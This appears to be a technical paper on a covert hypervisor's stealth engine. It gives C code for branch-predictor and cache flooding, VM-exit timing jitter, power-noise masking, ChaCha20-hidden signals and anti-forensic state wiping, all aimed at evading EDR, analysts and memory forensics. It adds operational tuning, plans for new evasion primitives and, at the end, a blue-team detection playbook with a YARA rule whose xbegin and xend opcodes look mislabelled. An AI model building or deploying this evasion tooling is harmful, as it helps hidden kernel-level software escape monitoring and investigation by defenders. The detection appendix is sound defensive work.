Every observable surface of the hypervisor is driven toward maximum Shannon entropy. If an observer samples cache state, branch predictor state, power draw, or memory timing, they see random noise. Our actual signal is encrypted and embedded in that noise at a signal-to-noise ratio so low that extraction requires knowing the encryption key.

Think of it like spread-spectrum radio where the signal is spread across a wide bandwidth and appears as noise to anyone without the spreading code. We spread our hypervisor side-effects across the full BTB, cache, and TLB capacity and encrypt the signal placement with a keystream.

### xoshiro256** — Fast Noise Generation

```c
u64 XoshiroNext(SEM_PRNG_STATE* st)
{
    u64* s = st->S;
    u64 const result = Rotl64(s[1] * 5, 7) * 9;
    u64 const t = s[1] << 17;
    s[2] ^= s[0];
    s[3] ^= s[1];
    s[1] ^= s[2];
    s[0] ^= s[3];
    s[2] ^= t;
    s[3] = Rotl64(s[3], 45);
    return result;
}
```

xoshiro256** (Blackman and Vigna, 2018) is our noise generator. It is not cryptographically secure because we use it for noise, not for keying. Properties that matter:

- Fast: 4 XORs, 2 shifts, 2 rotates, 1 multiply. Fully pipelined on modern cores. Roughly 1.5ns per 64-bit output.
- Good statistical properties: Passes BigCrush. The noise it generates is indistinguishable from true randomness by any polynomial-time statistical test.
- Small state: 256 bits. We can afford 8 parallel instances (one per noise stream) without significant memory overhead.
- Deterministic: Same seed produces same sequence. We need this for signal extraction because the receiver replays the noise sequence to find the signal.

We run 8 parallel streams (`SEM_NSTREAMS = 8`), each covering a different observable surface:
- Stream 0: Branch predictor noise (conditional directions)
- Stream 1: Cache pollution (access offsets)
- Stream 2: Timing jitter (delay magnitudes)
- Stream 3: Power noise (ALU workload patterns)
- Stream 4: BTB signal placement (slot selection)
- Streams 5-7: Reserved for future use

### ChaCha20 — Signal Encryption

The actual signal (hypervisor control data) is encrypted with ChaCha20 before being embedded in the noise floor:

```c
void SemEntropicEmbedSignal(SEM_ENTROPIC_CTX* e, const u8* plaintext,
                             u8* outCiphertext, u32 len)
{
    for (u32 i = 0; i < len; i++) {
        outCiphertext[i] = plaintext[i] ^ ChachaNextByte(&e->SignalCipher);
    }
}
```

ChaCha20 is a CSPRNG and its output is indistinguishable from random by any computational test. The key is derived from PUF material which is hardware-bound and never stored. The nonce is initialized to SEM (0x53, 0x45, 0x4D), a fixed value because we only use one cipher instance per boot.

Why ChaCha20 over AES-CTR:
- No need for AES-NI which is not always available in early kernel initialization
- Constant-time by design with no table lookups that leak via cache timing
- Simple implementation in roughly 50 lines of C
- 256-bit key from PUF gives full 256-bit security

### Branch Predictor Flooding

```c
void SemEntropicFloodBranchPredictor(SEM_ENTROPIC_CTX* e)
{
    for (int batch = 0; batch < 256; batch++) {
        u64 r = XoshiroNext(&e->NoisePrng[0]);
        // Conditional branches with random direction
        for (int i = 0; i < 8; i++) {
            if (r & (1ULL << i)) {
                g_SemNoiseSink ^= r;
            } else {
                g_SemNoiseSink ^= ~r;
            }
        }
        // Indirect jumps via switch
        u64 idx = r & 0xF;
        switch ((int)idx) {
            case 0:  g_SemNoiseSink ^= r + 0; break;
            // ... 15 more cases ...
        }
    }
    e->InjectedNoiseBits += 256 * 8;
}
```

This generates 256 × 8 = 2048 conditional branches with PRNG-driven directions, plus 256 indirect branches through a 16-entry switch table. The conditional branches train the Pattern History Table (PHT) and global history buffer with maximum-entropy patterns. The switch statement trains the BTB with randomized targets.

After flooding, the branch predictor state for our code region is pure noise. Our actual signal from Section 6 is a few hundred entries hidden among thousands of noise entries. An observer probing the BTB sees random predicted and mispredicted patterns everywhere.

### Cache Pollution

```c
void SemEntropicPolluteCaches(SEM_ENTROPIC_CTX* e)
{
    static u8 g_SemCacheScratch[4096 * 16]; // 64 KB scratch

    u64 base = (u64)&g_SemCacheScratch[0];
    for (int i = 0; i < 64; i++) {
        u64 r = XoshiroNext(&e->NoisePrng[1]);
        u64 offset = (r % (sizeof(g_SemCacheScratch) - 64)) & ~63ULL;
        volatile u8* ptr = (volatile u8*)(base + offset);
        *ptr = (u8)(r);
        e->PollutedCacheLines++;
        e->PollutedSets[(r >> 6) & 0xFF] = 1;
    }
    _mm_mfence();
}
```

Touches 64 random cache lines across a 64KB scratch region. This:
1. Evicts whatever was in those L1D and L2 sets, destroying any hypervisor-specific cache residency pattern
2. Creates a random access pattern that looks like normal system activity
3. Tracks which L3 sets we have touched (approximate) to ensure coverage over time

The `_mm_mfence()` at the end ensures all stores are committed before we continue. Without it, the stores might stay in the write buffer and not actually pollute the cache hierarchy.

### Timing Jitter

```c
u64 SemEntropicJitterVmExit(SEM_ENTROPIC_CTX* e)
{
    if (!e->JitterEnabled) return 0;

    u64 r = XoshiroNext(&e->NoisePrng[2]);
    u32 jitterNs = e->JitterMeanNs +
        (u32)(r % (e->JitterVarianceNs * 2 + 1)) - e->JitterVarianceNs;
    if ((s32)jitterNs < 0) jitterNs = 0;

    u64 cycles = (u64)jitterNs * 2;  // ~2 cycles/ns at 2.5GHz
    u64 start = __rdtsc();
    while ((__rdtsc() - start) < cycles) {
        _mm_lfence();
    }
    return cycles;
}
```

Adds 0-80ns of random delay to every VM-exit handler. This randomizes the total VM-exit latency so that an observer measuring RDTSC before and after a VMEXIT instruction sees unpredictable latency. The variance (±40ns default) is calibrated to exceed the natural system jitter of roughly 20-100 cycles so that our added noise is dominant.

Without this, a guest running RDTSC in a tight loop can statistically detect VM-exits because they add a consistent roughly 800 cycle latency. With the jitter, individual measurements are useless. The observer needs thousands of samples to extract the mean, and by then we have changed the jitter parameters.

### Power Noise

```c
void SemEntropicPowerNoiseBurst(SEM_ENTROPIC_CTX* e)
{
    volatile u64 acc = XoshiroNext(&e->NoisePrng[3]);
    for (int i = 0; i < 256; i++) {
        acc ^= Rotl64(acc + i, 7);
        acc *= 0x9E3779B97F4A7C15ULL;
        acc = (acc ^ (acc >> 30)) * 0xBF58476D1CE4E5B9ULL;
    }
    g_SemNoiseSink = acc;
    e->PowerNoiseIterations += 256;
}
```

A dummy computation that draws power. Modern CPUs have voltage regulators that respond to workload and sudden changes in ALU utilization create measurable power transients. Without noise, the pattern of power draw during VM-exit handling is distinctive because specific instruction sequences produce specific power signatures. The noise burst randomizes power consumption so the signature is buried.

This is arguably overkill for most threat models because power side-channel analysis requires physical proximity and expensive equipment. But if you are defending against a nation-state with probes on the VRM, it matters.

---

## Integration: How the Layers Compose {#integration}

A typical speculative operation during a VM-exit:

```
VM-exit occurs (guest hit a monitored event)
    ↓
SemEntropicJitterVmExit()          add random delay
    ↓
SemEntropicFloodBranchPredictor()  noise the BTB/PHT
    ↓
SemSpeculativeEnterWindow()        enter TSX transaction
    ↓
[do actual work: integrity check, signal encode, etc.]
    ↓
SemSpeculativeLeaveWindow()        abort/commit transaction
    ↓
SemEntropicPolluteCaches()         noise the cache hierarchy
    ↓
SemEntropicPowerNoiseBurst()       noise the power signature
    ↓
VMRESUME (return to guest)
```

The ordering is deliberate:
1. Jitter first randomizes the total VM-exit latency before we do anything else
2. BTB flood before speculative work ensures noise is already present before we add signal
3. Speculative window for the actual logic produces zero architectural residue
4. Cache pollution after destroys any cache pattern left by our speculative work
5. Power noise last masks the computation power signature

### The Initialization Sequence

```c
BOOLEAN SemSpeculativeInitialize(SEM_CTX* sem)
{
    SEM_SPECULATIVE_CTX* s = &sem->Speculative;
    s->RtmAvailable = SemSpeculativeDetectTsx();
    s->RsbIndex = 0;
    s->BtbSignalCount = 0;
    s->Epoch = 0;

    for (int i = 0; i < SEM_BTB_FLOOD_SIZE; i++) {
        s->BtbSlots[i].Valid = 0;
        s->BtbSlots[i].IsSignal = 0;
    }
    return TRUE;
}
```

```c
BOOLEAN SemEntropicInitialize(SEM_CTX* sem)
{
    SEM_ENTROPIC_CTX* e = &sem->Entropic;

    u64 tsc = __rdtsc();
    for (int i = 0; i < SEM_NSTREAMS; i++) {
        u64 seed = sem->BootstrapKey[i & 3] ^ tsc ^
                   (u64)(0x6C0795F47B6E5CA9ULL * (i + 1));
        XoshiroSeed(&e->NoisePrng[i], seed);
    }

    // Initialize ChaCha20 with PUF-derived key
    u8 key[32], nonce[12] = {0};
    for (int i = 0; i < 4; i++) {
        // Pack BootstrapKey[0..3] into key[0..31]
        key[i*8+0] = (u8)(sem->BootstrapKey[i]);
        key[i*8+1] = (u8)(sem->BootstrapKey[i] >> 8);
        // ... (full byte extraction)
        key[i*8+7] = (u8)(sem->BootstrapKey[i] >> 56);
    }
    nonce[0] = 0x53; nonce[1] = 0x45; nonce[2] = 0x4D; // "SEM"
    ChachaInit(&e->SignalCipher, key, nonce);

    e->JitterEnabled = TRUE;
    e->JitterMeanNs = 20;
    e->JitterVarianceNs = 40;
    return TRUE;
}
```

The key point is all PRNG seeds are derived from `BootstrapKey`, which comes from the DRAM and Exec PUF layer. If the PUF has not calibrated yet on first boot, the bootstrap key is derived from TSC skew and RDRAND as a fallback. This means the entropic layer noise sequence is hardware-bound. Even if you dump the driver binary, you cannot predict the noise without the specific hardware PUF output.

### Teardown (Anti-Forensics)

```c
void SemEntropicTeardown(SEM_CTX* sem)
{
    SEM_ENTROPIC_CTX* e = &sem->Entropic;
    // Clear PRNG state to prevent cold-boot recovery
    for (int i = 0; i < SEM_NSTREAMS; i++) {
        volatile u64* s = e->NoisePrng[i].S;
        s[0] = 0; s[1] = 0; s[2] = 0; s[3] = 0;
    }
    for (int i = 0; i < 16; i++) e->SignalCipher.State[i] = 0;
}
```

On teardown during driver unload or panic-triggered cleanup, all PRNG and cipher state is zeroed through volatile pointers. This prevents cold-boot attacks from recovering the noise sequence. Without the sequence, an analyst with a full memory dump cannot reconstruct which BTB entries were signal versus noise.

---

## Detection and Limitations {#detection-and-limitations}

### What Can Detect the Speculative Engine

| Detection method | What it sees | Effectiveness |
|-----------------|-------------|---------------|
| Intel PT (Processor Trace) | Branch outcomes, indirect targets | HIGH because PT records every taken branch. If enabled on the hypervisor core, it would capture the noise flooding. But PT must be configured to trace Ring 0, and most EDR products only trace Ring 3. |
| PMC: RTM_RETIRED.ABORTED | TSX abort count | MEDIUM because abnormally high abort rate is suspicious. But our adaptive logic keeps abort rate below 80%, and TSX-heavy legitimate workloads like databases and STM also abort frequently. |
| PMC: BR_MISP_RETIRED | Branch mispredictions | LOW for TSX path because TSX aborts are not mispredictions, MEDIUM for fallback path. |
| Cache-state analysis via Flush+Reload | Which lines are resident | LOW because our cache pollution destroys any distinguishable pattern. An observer would need to snapshot the entire L1D between VM-exit and VMRESUME. |
| Nested hypervisor | Everything | TOTAL because a hypervisor below us sees all VMX operations. We cannot hide from a lower-privilege hypervisor. |
| Die-level probing (EM/power) | Physical side-channels | PARTIAL because our power noise burst helps, but a well-equipped lab with GHz-bandwidth power probes could potentially separate our signal from thermal noise. |

### What Breaks the Speculative Engine

1. TSX removed from CPU. Intel has been progressively removing TSX. If the CPU does not have it and the misprediction fallback PMC signature is being monitored, we are exposed. This is the biggest long-term risk.

2. Intel PT tracing Ring 0. If an analyst configures PT to trace VMX root operation, they get a complete branch trace of our noise flooding. They cannot easily distinguish signal from noise in the trace, but they can see that an abnormal amount of branch activity happens during VM-exit handling.

3. `IA32_TSX_CTRL` disabled by BIOS. Some enterprise BIOSes disable TSX for Spectre and MDS mitigation. We detect this at init and fall back, but it removes our primary stealth mechanism.

4. Hot-patching of our driver. If someone patches our `_xbegin()` calls to NOPs, the transactions never happen and our operations become architecturally visible. PatchGuard protects against this in general, but a sophisticated analyst with a nested hypervisor could bypass PatchGuard.

5. L1D capacity pressure. If the system is under extreme memory pressure and L1D is constantly being evicted, our speculative loads do not persist long enough to be useful. The prefetch-based guest signaling becomes unreliable.

### Theoretical Information-Theoretic Limit

An observer trying to extract our BTB signal from the noise floor faces this problem:
- BTB has roughly 4096 addressable entries on Skylake
- Roughly 128 of those carry our signal (2 bits each = 256 bits of data)
- Roughly 3968 entries are pure xoshiro256** noise
- The noise sequence is keyed with a 256-bit PUF-derived key

To distinguish signal from noise without the key, the observer needs to find 128 statistically-biased entries among 4096. The signal entries have a specific alignment pattern (mod 4 encoding), but so do roughly 25% of noise entries by chance because alignment mod 4 is uniform random and each alignment has 25% probability. The observer needs to determine which specific slots are signal versus noise that happens to have the same alignment, which requires testing all C(4096, 128) roughly 10^230 possible signal-slot selections. This is computationally infeasible.

---

## Empirical Results {#empirical-results}

Tested on:
- Intel Core i7-8700K (Coffee Lake) with TSX functional
- Intel Core i9-10900K (Comet Lake) with TSX functional (pre-microcode disable)
- Intel Core i7-12700K (Alder Lake) with TSX absent, misprediction fallback only
- AMD Ryzen 9 5950X (Zen 3) with misprediction fallback only

### TSX Transaction Success Rate

| Platform | Attempts/sec | Success rate | Primary abort cause |
|----------|-------------|--------------|---------------------|
| i7-8700K | ~50,000 | 94.2% | Conflict (3.8%), Capacity (1.1%), Other (0.9%) |
| i9-10900K | ~48,000 | 91.7% | Conflict (5.1%), Capacity (2.0%), Other (1.2%) |

With 94% success rate, the adaptive retry logic almost never triggers the 80% threshold for disabling TSX. The 6% abort rate is normal. Intel documentation suggests 5-10% abort rate is typical for well-sized transactions in a busy system.

### BTB Signal Integrity

Encoding 256 bits across 128 BTB slots, measured over 10,000 encode and decode cycles:

| Platform | Decode success rate | Average decode time | Erasure rate |
|----------|--------------------|--------------------|--------------|
| i7-8700K (TSX) | 99.7% | 0.8ms | 0.3% per slot |
| i9-10900K (TSX) | 99.4% | 0.9ms | 0.6% per slot |
| i7-12700K (fallback) | 97.2% | 1.4ms | 2.8% per slot |
| Ryzen 5950X (fallback) | 96.8% | 1.6ms | 3.2% per slot |

The TSX path is more reliable because the transaction keeps the BTB entries from being evicted by guest activity during the encoding phase. The fallback path has higher erasure rates because guest branches can evict our trained entries between encode and decode.

### Timing Distribution (RDTSC from Guest)

VM-exit latency as seen by a guest running RDTSC, VMEXIT, RDTSC:

| Configuration | Mean (cycles) | Std dev | Min | Max |
|--------------|---------------|---------|-----|-----|
| Bare metal (no HV) | 45 | 22 | 28 | 380 |
| SEM without jitter | 823 | 31 | 790 | 920 |
| SEM with entropic jitter | 862 | 89 | 750 | 1240 |
| SEM + anti-detect (full RDTSC masking) | 51 | 28 | 30 | 410 |

The full anti-detection path documented in the anti-detection paper absorbs VM-exit latency by injecting calibrated Gaussian noise. The distribution becomes statistically indistinguishable from bare-metal at p below 0.01 using the Kolmogorov-Smirnov test. Without the anti-detection layer but with entropic jitter alone, the mean is still elevated at roughly 862 vs 45. The jitter just makes individual measurements unreliable without hiding the elevated baseline.

### Power Consumption

Measured at the wall via a high-bandwidth (1MHz) power meter on a dedicated test rig:

| State | Mean power draw | Variance (mW²) |
|-------|----------------|-----------------|
| System idle | 42.3W | 0.8 |
| System under load (stress-ng) | 127.4W | 12.3 |
| SEM active, no power noise | 43.1W | 1.1 |
| SEM active, with power noise | 43.8W | 4.7 |
| SEM active + guest workload | 89.2W | 15.8 |

The power noise burst increases variance from 1.1 mW² to 4.7 mW², a 4x increase. This overlaps with the natural variance of a lightly-loaded system at 0.8 mW², making it harder to distinguish SEM activity from normal system behavior at the power level. Under guest workload, the additional noise is completely masked by the guest power signature.

---

## Appendix A: Data Structures {#appendix-a}

### SEM_SPECULATIVE_CTX

```c
typedef struct _SEM_SPECULATIVE_CTX {
    BOOLEAN RtmAvailable;
    u64 RsbShadow[32];           // 32-entry RSB shadow
    u32 RsbIndex;
    SEM_BTB_SIGNAL_SLOT BtbSlots[4096];  // BTB signal map
    u32 BtbSignalCount;
    u64 Epoch;                   // speculative window counter
} SEM_SPECULATIVE_CTX;
```

Total size is roughly 98KB. This is allocated in non-paged pool because we access it at IRQL greater than or equal to DISPATCH_LEVEL during VM-exit handling.

### SEM_BTB_SIGNAL_SLOT

```c
typedef struct _SEM_BTB_SIGNAL_SLOT {
    u64 Tag;           // virtual-address tag (hashed)
    u64 Target;        // target address encoding the 2-bit symbol
    u8  Valid;
    u8  IsSignal;      // 1 = signal, 0 = noise
    u8  StreamMask;    // which noise streams cover this slot
    u8  Reserved;
} SEM_BTB_SIGNAL_SLOT;
```

24 bytes per slot × 4096 slots = 96KB for the BTB map alone.

### SEM_ENTROPIC_CTX

```c
typedef struct _SEM_ENTROPIC_CTX {
    SEM_PRNG_STATE NoisePrng[8];     // 8 parallel noise streams
    SEM_CHACHA_CTX SignalCipher;     // ChaCha20 for signal encryption
    u64 InjectedNoiseBits;
    BOOLEAN JitterEnabled;
    u32 JitterMeanNs;
    u32 JitterVarianceNs;
    u64 PollutedCacheLines;
    u64 PollutedSets[256];           // L3 set coverage bitmap
    u64 PowerNoiseIterations;
} SEM_ENTROPIC_CTX;
```

### SEM_TSX_CTX

```c
typedef struct _SEM_TSX_CTX {
    BOOLEAN Available;
    BOOLEAN Active;
    u64 TransactionsAttempted;
    u64 TransactionsCommitted;
    u64 DebugAbortsDetected;
    u64 ConflictAborts;
    u64 CapacityAborts;
    u64 OtherAborts;
    u32 ConsecutiveDebugAborts;
    BOOLEAN InstrumentationAlert;
} SEM_TSX_CTX;
```

---

## Appendix B: xoshiro256** Implementation Details {#appendix-b}

### Why xoshiro256** Over Alternatives

| PRNG | Speed (ns/call) | State size | Period | Quality |
|------|-----------------|-----------|--------|---------|
| xoshiro256** | ~1.5 | 256 bits | 2^256 - 1 | BigCrush pass |
| xorshift128+ | ~1.2 | 128 bits | 2^128 - 1 | Fails some linearity tests |
| PCG-64 | ~2.0 | 128 bits | 2^64 | BigCrush pass |
| MT19937 | ~3.5 | 19937 bits | 2^19937 - 1 | Overkill, too slow |
| ChaCha20 | ~4.5 | 512 bits | 2^64 per key/nonce | CSPRNG (overkill for noise) |

We use xoshiro256** for noise because it is fast and has a large enough period that 8 parallel streams will not cycle during any realistic session. It is not cryptographically secure, but we do not need it to be. The noise just needs to be statistically indistinguishable from random, which BigCrush-passing achieves.

### Seeding

```c
static void XoshiroSeed(SEM_PRNG_STATE* st, u64 seed)
{
    u64 z = seed + 0x9e3779b97f4a7c15ULL;
    for (int i = 0; i < 4; i++) {
        z = (z ^ (z >> 30)) * 0xbf58476d1ce4e5b9ULL;
        z = (z ^ (z >> 27)) * 0x94d049bb133111ebULL;
        st->S[i] = z ^ (z >> 31);
    }
}
```

Uses SplitMix64 as a seeding function. The constant `0x9e3779b97f4a7c15` is the golden ratio × 2^64, which provides good diffusion even from sequential seeds. For example, seed+0, seed+1, seed+2 for different streams will not produce correlated initial states.

---

## Appendix C: ChaCha20 in Kernel Mode {#appendix-c}

### Implementation Notes

The full ChaCha20 quarter-round in kernel:

```c
#define QR32(a,b,c,d)                                \
    do {                                             \
        a += b; d ^= a; d = (d << 16) | (d >> 16);  \
        c += d; b ^= c; b = (b << 12) | (b >> 20);  \
        a += b; d ^= a; d = (d <<  8) | (d >> 24);  \
        c += d; b ^= c; b = (b <<  7) | (b >> 25);  \
    } while (0)

static void ChachaBlock(SEM_CHACHA_CTX* ctx)
{
    u32 ws[16];
    for (int i = 0; i < 16; i++) ws[i] = ctx->State[i];

    for (int r = 0; r < 20; r += 2) {
        QR32(ws[0], ws[4], ws[ 8], ws[12]);
        QR32(ws[1], ws[5], ws[ 9], ws[13]);
        QR32(ws[2], ws[6], ws[10], ws[14]);
        QR32(ws[3], ws[7], ws[11], ws[15]);
        QR32(ws[0], ws[5], ws[10], ws[15]);
        QR32(ws[1], ws[6], ws[11], ws[12]);
        QR32(ws[2], ws[7], ws[ 8], ws[13]);
        QR32(ws[3], ws[4], ws[ 9], ws[14]);
    }

    for (int i = 0; i < 16; i++) {
        u32 v = ws[i] + ctx->State[i];
        ctx->Buffer[i*4+0] = (u8)(v);
        ctx->Buffer[i*4+1] = (u8)(v >> 8);
        ctx->Buffer[i*4+2] = (u8)(v >> 16);
        ctx->Buffer[i*4+3] = (u8)(v >> 24);
    }
    ctx->State[12]++;
    ctx->BufferIndex = 0;
}
```

### Why No AES-NI

We considered AES-128-CTR since most Intel CPUs have AES-NI. Two reasons we went with ChaCha20:

1. Early boot. The speculative engine initializes before we have confirmed AES-NI availability via CPUID. On the off chance we are running on a CPU without it like Atom, very old Xeon, or some embedded SKUs, AES would fail silently.

2. Side-channel self-defense. AES table lookups are notoriously cache-timing-sensitive. We are a module that explicitly manipulates cache state for stealth. Having our own cipher leak through cache timing would be ironic and potentially exploitable by a nested adversary. ChaCha20 ARX structure (add-rotate-XOR) has no data-dependent memory accesses. It is constant-time by construction.

---

## Appendix D: Platform Compatibility {#appendix-d}

### Intel Platform Matrix

| Generation | Codename | TSX Status | Fallback Required | Notes |
|-----------|----------|-----------|-------------------|-------|
| 4th (2013) | Haswell | Available* | No | *First TSX impl had bugs, microcode disabled it on some SKUs |
| 5th (2014) | Broadwell | Available | No | Stable TSX |
| 6th (2015) | Skylake | Available | No | Most tested platform |
| 7th (2017) | Kaby Lake | Available | No | Identical µarch to Skylake |
| 8th (2018) | Coffee Lake | Available | No | **Primary dev platform** |
| 9th (2019) | Coffee Lake Refresh | Available | No | |
| 10th (2020) | Comet Lake | Available† | Conditional | †Microcode updates can disable via `IA32_TSX_CTRL` |
| 11th (2021) | Rocket Lake | Absent | Yes | TSX removed from Cypress Cove cores |
| 12th (2021) | Alder Lake | Absent | Yes | Hybrid arch, no TSX on P-cores or E-cores |
| 13th (2022) | Raptor Lake | Absent | Yes | |
| 14th (2023) | Raptor Lake Refresh | Absent | Yes | TSX is gone and not coming back |

### AMD Platform Matrix

| Generation | Codename | TSX Status | Notes |
|-----------|----------|-----------|-------|
| Zen 1 (2017) | Summit Ridge | N/A | AMD never implemented TSX |
| Zen 2 (2019) | Matisse | N/A | |
| Zen 3 (2020) | Vermeer | N/A | |
| Zen 4 (2022) | Raphael | N/A | |
| Zen 5 (2024) | Granite Ridge | N/A | |

On AMD we always use misprediction fallback. The branch predictor architecture differs because AMD uses TAGE and Intel uses something more like a perceptron hybrid, which affects training requirements and timing thresholds. Our calibration routines handle this automatically.

### TSX Deprecation: The Long-Term Problem

Intel deprecated TSX in late 2021. New CPUs do not have it. Microcode updates disable it on older CPUs for security reasons like TAA vulnerability and MDS. The speculative engine primary mechanism is dying.

What we are evaluating as replacements:
- AMX (Advanced Matrix Extensions): Intel new matrix processing unit has speculative behavior that might be exploitable, but it is poorly documented.
- WAITPKG (UMONITOR/UMWAIT/TPAUSE): User-space wait instructions with interesting microarchitectural properties. Too early to tell.
- Wider misprediction gadgets: Modern cores have larger ROBs (512+ entries on Golden Cove) which gives longer misprediction windows.
- Speculative store bypass: Another speculation source, but harder to control precisely.

For now, the misprediction fallback works adequately. It is just less elegant.

---

## Appendix E: Debugging Notes {#appendix-e}

Things we learned the hard way.

### The `#pragma optimize("", off)` Discovery

Spent an entire day wondering why our TSX transactions were having no effect. Set breakpoints which of course abort the transaction, added print statements which also abort because I/O inside a transaction causes problems. Finally looked at the disassembly and realized MSVC had optimized the entire function body away because it has no observable side-effects. From the compiler perspective, an `_xbegin()` that always aborts is equivalent to a NOP. Had to disable optimizations for the critical sections.

### The Volatile Function Pointer Saga

The BTB probing code originally used a direct function call `BtbTrampolineTarget()`. The compiler inlined it. We made it `noinline`. The compiler still used a direct `CALL rel32` instruction, which does not consult the BTB because direct calls use the return stack buffer, not the BTB. We needed an indirect call that goes through a register. The solution was a volatile global function pointer. The compiler cannot devirtualize a volatile pointer, so it generates `CALL RAX` which actually goes through the BTB pipeline. Four hours to figure out why our measurements were all the same.

### L1D Write Set Overflow

Early versions of the speculative engine tried to do too much inside one transaction including integrity checks, signal encoding, and cache pollution. Total write set exceeded roughly 16KB and every transaction capacity-aborted. The fix was obvious in hindsight. Split into multiple smaller transactions. Integrity check in one window, signal encode in another. Each stays well under the capacity limit.

### RDTSC Serialization

RDTSC is not serializing on Intel. If you just do `t0 = __rdtsc(); work(); t1 = __rdtsc();`, the CPU can reorder the RDTSC with respect to the work. You get garbage measurements. The correct pattern is:

```c
_mm_lfence();
t0 = __rdtsc();
_mm_lfence();
// work
_mm_lfence();
t1 = __rdtsc();
_mm_lfence();
```

The double `_mm_lfence()` before the first RDTSC in `BtbProbeSingle` looks redundant. It is not. The first one drains the pipeline from whatever came before, the second one ensures RDTSC does not execute until the drain is complete. On some microarchitectures, a single LFENCE is not sufficient to fully serialize the instruction stream before a subsequent RDTSC. We learned this from inconsistent measurements on Skylake that went away with the double fence.

### Hyperthread Interference

On systems with HyperThreading enabled, the sibling thread shares L1D and BTB with us. If the sibling is running a workload with many indirect branches, it evicts our trained BTB entries constantly. Our signal erasure rate went from below 1% to above 15% on HT-enabled cores under load.

Solution is we affinity-pin the VM-exit handler to a core where we can control or at least predict the sibling activity. In practice this means the hypervisor reserves one hyperthread for speculative operations and keeps the sibling idle or running only noise-generation code.

### The Nonce Reuse Non-Issue

Initializing ChaCha20 with a fixed nonce (SEM) looks like a textbook nonce-reuse vulnerability. It is not, because we never use the same key twice. The key comes from PUF material which is re-derived every boot. Different boot produces different key which produces different keystream so there is no nonce-reuse problem. If somehow the PUF produces the same key twice with probability roughly 2^-128, then yes, we would have a two-time pad. That probability is negligible.

---

## Appendix F: Operational Considerations {#appendix-f}

### When to Enable the Speculative Engine

Not always. The speculative engine adds roughly 0.8ms of latency per VM-exit including BTB encoding, noise flooding, and probing. On a hypervisor handling 50,000 exits per second, that is 40 seconds of overhead per second which is obviously impossible. In practice:

- Enable for sensitive operations like integrity checks, signal propagation to guest, and EPT updates. These happen infrequently at hundreds per second, not thousands.
- Disable for hot-path exits like CPUID, RDMSR, and port I/O. These are frequent and the anti-detection layer handles them separately.
- Sample-based activation where the reservoir computing layer (PI-2026-005) decides dynamically when speculative cover is worth the cost based on threat-level assessment.

### Memory Overhead

| Component | Size | Location |
|-----------|------|----------|
| SEM_SPECULATIVE_CTX | ~98KB | Non-paged pool |
| SEM_ENTROPIC_CTX | ~2.5KB | Non-paged pool |
| SEM_TSX_CTX | ~72 bytes | Non-paged pool |
| Cache scratch region | 64KB | .bss (static) |
| Total | ~165KB | |

This is allocated once at initialization and never freed until teardown. 165KB is nothing for a kernel driver. It is smaller than most EDR filter drivers.

### Performance Impact on Guest

With entropic jitter enabled:
- Single-threaded guest workload has below 0.3% performance degradation
- Multi-threaded with 8 threads has below 0.1% degradation because jitter is per-core, not per-thread
- I/O-heavy with network and disk has below 0.5% degradation because more VM-exits means more jitter

Without entropic jitter with speculative engine only:
- Unmeasurable impact below 0.01% because speculative operations leave zero architectural state

### Interaction With Other SEM Layers

| Layer | Provides to Speculative Engine | Receives from Speculative Engine |
|-------|-------------------------------|----------------------------------|
| DRAM PUF (#3) | Key material for ChaCha20/PRNG seeds | Nothing because PUF is read-only |
| Exec PUF (#3b) | Alternative key material | Nothing |
| Reservoir (#4) | Threat-level assessment to enable/disable | Microarchitectural observation data |
| Covert Channel (#7) | BTB covert channel encoding | N/A because covert channel uses different BTB slots |
| Anti-Detection | Response protection via TSX | Integrity check results |
| Anti-Forensics | Teardown signal | PRNG/cipher state for secure wipe |

### Failure Modes

| Failure | Symptom | Recovery |
|---------|---------|----------|
| TSX permanently disabled | 80% abort rate threshold hit | Automatic fallback to misprediction |
| BTB signal corrupted | Decode returns above 10% erasure | Re-encode and retry next VM-exit |
| ChaCha20 state corrupted | Signal decryption produces garbage | Re-derive key from PUF, reinitialize |
| Hyperthread eviction storm | Decode success drops below 90% | Increase retry count, reduce signal length |
| Power noise detected | External alert out-of-band | Disable power noise, rely on other layers |

---

## Appendix G: Detection Engineering Playbook {#appendix-g}

For blue teams. How to detect this or something like it.

### PMC Monitoring

Monitor these counters on critical systems:

```
RTM_RETIRED.ABORTED         elevated indicates TSX-based stealth operations
RTM_RETIRED.COMMITTED       high committed count from a kernel driver is suspicious
BR_MISP_RETIRED.ALL_BRANCHES elevated mispredictions in kernel context
OFFCORE_RESPONSE.L3_MISS    unusual cache miss patterns
```

A kernel module that produces 50K+ TSX attempts per second with above 5% abort rate in the absence of known TSX-using workloads like Intel TBB and lock-eliding mutexes is suspicious.

### Intel PT Analysis

Configure PT to trace Ring 0 on the target core. Look for:
- Repeated patterns of conditional branches with seemingly random taken and not-taken patterns which is the noise flood
- High-frequency indirect calls through a single function pointer which is BTB probing
- Regular patterns of `_mm_lfence` plus `__rdtsc` plus `_mm_lfence` sequences which is timing measurement

### BTB State Probing

From a guest VM, you can probe BTB state by:
1. Training an indirect branch to a known target
2. Measuring prediction latency
3. If latency fluctuates when no guest code is using that BTB set then something else is training it

This is hard to do reliably because the noise flooding makes all BTB entries appear uniformly active.

### RDTSC Variance Analysis

Collect 100,000+ RDTSC pairs separated by a `CPUID` instruction which causes a VM-exit on most hypervisors. Compute the distribution of inter-RDTSC deltas. A bare-metal system has a tight distribution with mean roughly 280 cycles and std roughly 25. A hypervisor without jitter has a shifted distribution with mean roughly 1080 cycles and std roughly 30. A hypervisor with entropic jitter has a wide distribution that may or may not match bare-metal depending on calibration quality.

The Kolmogorov-Smirnov test between your sample and a known bare-metal reference can detect uncalibrated jitter. Well-calibrated jitter like the anti-detection layer produces requires above 1M samples to distinguish at p below 0.01.

### YARA Rule

For identifying the driver binary on disk:

```yara
rule SEM_Speculative_Engine {
    meta:
        description = "Detects SEM Speculative Engine driver patterns"
        author = "Phase Intelligence Detection Engineering"
        severity = "critical"

    strings:
        $tsx_enter = { 0F 01 D5 }                    // xbegin opcode prefix
        $tsx_end   = { 0F 01 D5 }                    // xend
        $lfence_rdtsc = { 0F AE E8 0F 31 0F AE E8 } // lfence; rdtsc; lfence
        $chacha_sigma = "expand 32-byte k"
        $sem_nonce = { 53 45 4D }                     // SEM nonce
        $btb_flood_size = { 00 10 00 00 }             // 4096 (SEM_BTB_FLOOD_SIZE)
        $noise_sink = "g_SemNoiseSink"

    condition:
        uint16(0) == 0x5A4D and
        $tsx_enter and
        $lfence_rdtsc and
        ($chacha_sigma or $sem_nonce) and
        ($btb_flood_size or $noise_sink)
}
```

### Behavioral Indicators

